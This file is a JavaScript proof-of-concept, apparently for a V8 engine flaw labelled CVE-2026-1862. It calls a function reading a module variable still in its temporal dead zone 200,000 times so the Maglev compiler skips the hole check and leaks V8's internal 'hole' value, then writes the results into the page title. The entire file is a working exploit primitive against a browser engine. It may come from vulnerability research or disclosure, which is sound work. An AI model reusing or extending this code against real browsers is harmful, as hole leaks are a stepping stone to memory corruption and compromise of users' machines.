// CVE-2026-1862 PoC v3 — try-catch approach
// Strategy: call the leaker function many times with try-catch
// Interpreter throws ReferenceError (TDZ), caught by try-catch
// After enough calls, Maglev compiles the function
// Maglev-compiled code skips hole check → hole leaks (no throw)

function readModuleVar() {
  return x; // Module variable via LoadTaggedField(cell, Cell::kValueOffset)
}

let leaked = undefined;
let threw = 0;
let succeeded = 0;

// Phase 1: Call readModuleVar many times while x is in TDZ
// Interpreter will throw, Maglev will eventually compile and skip hole check
for (let i = 0; i < 200000; i++) {
  try {
    let val = readModuleVar();
    // If we get here, the hole check was skipped (Maglev compiled!)
    if (succeeded === 0) {
      leaked = val;
    }
    succeeded++;
  } catch(e) {
    threw++;
  }
}

// Phase 2: Initialize x
export let x = 42;

// Phase 3: Report
let isHole = (typeof leaked === "undefined" && leaked !== undefined);

let tests = {
  threw: threw,
  succeeded: succeeded,
  type: typeof leaked,
  isUndefined: leaked === undefined,
  isHole: isHole,
};

try { tests.str = String(leaked); } catch(e) { tests.strErr = e.message; }
try { tests.num = Number(leaked); } catch(e) { tests.numErr = e.message; }

if (isHole) {
  tests.HOLE_LEAKED = true;
}

if (typeof document !== 'undefined') {
  document.title = "V3:" + JSON.stringify(tests);
}
